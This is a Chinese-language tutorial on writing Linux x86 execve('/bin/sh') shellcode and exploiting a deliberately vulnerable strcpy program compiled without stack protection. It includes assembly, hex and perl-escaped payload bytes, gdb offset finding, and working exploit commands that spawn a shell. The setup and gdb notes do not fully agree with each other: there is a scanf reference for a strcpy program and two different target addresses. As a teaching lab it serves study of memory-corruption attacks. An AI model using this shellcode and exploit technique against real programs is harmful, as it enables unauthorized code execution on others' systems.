# Shellcoding in Linux

## x86系统调用

这里介绍如何通过缓存溢出执行shellcode，获得系统shell。在shellcode中我们需要一次系统调用，即`execve`。

首先我们从网页 [https://w3challs.com/syscalls/?arch=x86](https://w3challs.com/syscalls/?arch=x86) 查询系统调用`execve`的参数设置。

| eax  |        ebx        |            ecx            |            edx            |
| :--: | :---------------: | :-----------------------: | :-----------------------: |
| 0x0b | const char \*name | const char \*const \*argv | const char \*const \*envp |

在执行系统调用时，将`$eax`寄存器的值设为`0x0b`，在内存中放置字符串`/bin/sh`并将`$ebx`设为字符串的地址，在内存中放置`/bin/sh`的地址并紧随其后放置`NULL`指针并将`$ecx`设为该地址的地址，最后将`$edx`寄存器设置为该`NULL`指针的地址（即不提供任何环境变量）。

设置好之后，用`int 0x80`指令来执行系统调用。

## 编写Shellcode

我们的shellcode需要自给自足，所以需要的字符串都要硬编码进shellcode中。而`/bin/sh`这个字符串必须以零结尾，所以字符串一般放在最后。直接放置字符串的汇编指令为`db`。

在不知道这段shellcode会存在于内存中的哪个位置的情形下，可以使用`call`指令来将字符串的内存地址压入运行时栈，然后用`pop`获取。因此汇编代码最后两行如下：

```asm
ender:
	call starter
	db '/bin/sh'
```

从代码开始跳转到这里来，并且跳转位置必须是相对的，所以用`jmp short`指令。

```asm
_start:
	jmp short ender

starter:
	pop ebx

ender:
	call starter
	db '/bin/sh'
```

将字符串地址存入`$ebx`寄存器后，用下面的指令将字符串零结尾，并将字符串的地址以及紧随的`NULL`放在字符串后面。为了避免在shellcode中产生零字节，用`xor eax, eax`指令来获取零。

```asm
starter:
	pop ebx
	xor eax, eax
	mov [ebx+7], al
	mov [ebx+8], ebx
	mov [ebx+12], eax
```

然后设置`$eax, $ecx, $edx`寄存器，最后呼叫系统调用。

```asm
	mov al, 11
	lea ecx, [ebx+8]
	lea edx, [ebx+12]
	int 0x80
```

最终完整代码如下

```asm
[SECTION .text]

global _start

_start:
	jmp short ender

starter:
	pop ebx
	xor eax, eax
	mov [ebx+7], al
	mov [ebx+8], ebx
	mov [ebx+12], eax
	mov al, 11
	lea ecx, [ebx+8]
	lea edx, [ebx+12]
	int 0x80

ender:
	call starter
	db '/bin/sh'
```

## 编译shellcode

将代码保存在`shell.asm`文件中，用汇编器`nasm`编译（Ubuntu 下可直接用 `sudo apt install nasm` 安装）。

```bash
$ nasm -f elf shell.asm
```

命令生成了`shell.o`文件。使用`objdump`命令查看编译好的代码。

```asm
$ objdump -d shell.o

shell.o:     file format elf32-i386
Disassembly of section .text:00000000
<_start>:
   0:	eb 16                	jmp    18 <ender>00000002 <starter>:
   2:	5b                   	pop    %ebx
   3:	31 c0                	xor    %eax,%eax
   5:	88 43 07             	mov    %al,0x7(%ebx)
   8:	89 5b 08             	mov    %ebx,0x8(%ebx)
   b:	89 43 0c             	mov    %eax,0xc(%ebx)
   e:	b0 0b                	mov    $0xb,%al
   10:	8d 4b 08             	lea    0x8(%ebx),%ecx
   13:	8d 53 0c             	lea    0xc(%ebx),%edx
   16:	cd 80                	int    $0x8000000018 <ender>:
   18:	e8 e5 ff ff ff       	call   2 <starter>
   1d:	2f                   	das
   1e:	62 69 6e             	bound  %ebp,0x6e(%ecx)
   21:	2f                   	das
   22:	73 68                	jae    8c <ender+0x74>
```

于是我们得到了最终的shellcode（hex编码）如下

```
eb165b31c0884307895b0889430cb00b8d4b088d530ccd80e8e5ffffff2f62696e2f7368
```

我们需要用`perl`将这段无法直接用键盘输入的shellcode放在命令行上。这个`perl`命令如下：

```bash
$ perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'
```

## 缓存溢出程序

下面是一段非常简单的有缓存溢出漏洞的程序。该程序不加检查地从命令行读拷贝字符串到`buf`中。

```c
/* overflow.c */
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]) {
  char buf[16];
  strcpy(buf,argv[1]);
  printf("%s\n",buf);
  return 0;
}
```

将程序存入文件`overflow.c`，编译程序

```bash
$ gcc -m32 -z execstack -fno-stack-protector overflow.c -o overflow
```

选项`-m32`将程序编译成32位，选项`-z execstack`允许将运行时栈上的数据当做代码执行，选项`-fno-stack-protector`关闭缓存溢出保护。如果无法编译或运行32位程序，安装下列对32位的支持。

```bash
$ sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 gcc-multilib
```

## 调试缓存溢出程序

用`gdb`调试该程序。

```bash
$ gdb -q overflow
```

在`main`的开始位置下断点。

```
(gdb) b *main
```

使用`b main`虽然也可以下断点，但`gdb`会自动将断点位置调整到运行时栈指针设置好之后，函数“正式”开始运行之前。但我们需要知道`main`函数的返回地址在内存中的确切位置，该位置在`call main`指令之后存储在`$esp`寄存器中。

```
(gdb) r
Breakpoint 1, 0x565555b0 in main ()
(gdb) i r esp
esp            0xffffd1bc	0xffffd1bc
```

于是我们获知返回地址存储在内存中的`0xffffd1bc`位置。接着在`scanf`调用的指令处下断点并运行到这里。

```
(gdb) b *main+47
(gdb) c
```

这时栈顶存储了两个参数，其中`$esp`指向存储模式字符串`"%s"`的指针，`$esp+4`指向`buf`。检查这两个内存的值

```
(gdb) x/2xw $esp
0xffffd180:	0x565556c0	0xffffd190
(gdb) p *(char**)$esp
$1 = 0x565556c0 "%s"
```

于是我们获知了`buf`的地址`0xffffd190`。用返回地址的位置减去之得`0x2c`即十进制的44。因此，首先输入shellcode，然后填充至44个字节，然后输入shellcode的地址（即`buf`的地址`0xfff
fd190`）。因为shellcode长度为36字节，因此需要填充8字节。

注意到`main`函数的开头和结尾（不同环境下编译结果可能有区别，因而不存在这个问题）

```asm
0x565555b0 <+0>:		lea    0x4(%esp),%ecx
0x565555b4 <+4>:		and    $0xfffffff0,%esp
0x565555b7 <+7>:		pushl  -0x4(%ecx)
0x565555ba <+10>:	push   %ebp
0x565555bb <+11>:	mov    %esp,%ebp
0x565555bd <+13>:	push   %ebx
0x565555be <+14>:	push   %ecx...
0x565555fe <+78>:	pop    %ecx
0x565555ff <+79>:	pop    %ebx
0x56555600 <+80>:	pop    %ebp
0x56555601 <+81>:	lea    -0x4(%ecx),%esp
0x56555604 <+84>:	ret
```

堆栈指针会加四然后存在堆栈中。覆盖返回地址势必会覆盖堆栈指针，使得`lea -0x4(%ecx),%esp`指令将堆栈指针移走。所以我们用当前堆栈指针加四之后得到的值进行覆盖。这个值刚好就是返回值地址的下一个地址，也就是shellcode存放的地址，因此我们直接用`0xffffd190`填充48字节（重复12遍），紧跟着shellcode即可。

删除所有断点，重新运行程序，成功获得shell。

```
(gdb) k
(gdb) d br(gdb) r `perl -e 'print "\x90\xd1\xff\xff"x12``perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"`
`���`���`���`���`���`���`���`���`���`���`���`����[1��C��C                                                          �                                                           ��S                                                              �����/bin/shprocess 17759 is executing new program: /bin/dash$ lsoverflow.c overflow  shell.asm shell.o$ cd ..
$ exit
```

退出`gdb`，从命令行直接运行，成功获取shell。

```Shell
$ ./overflow `perl -e 'print "\xc0\xd1\xff\xff"x12'``perl -e 'print "\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`�������������������������������������������������[1��C��C                                                          �                                                           ��S                                                              �����/bin/sh$
```
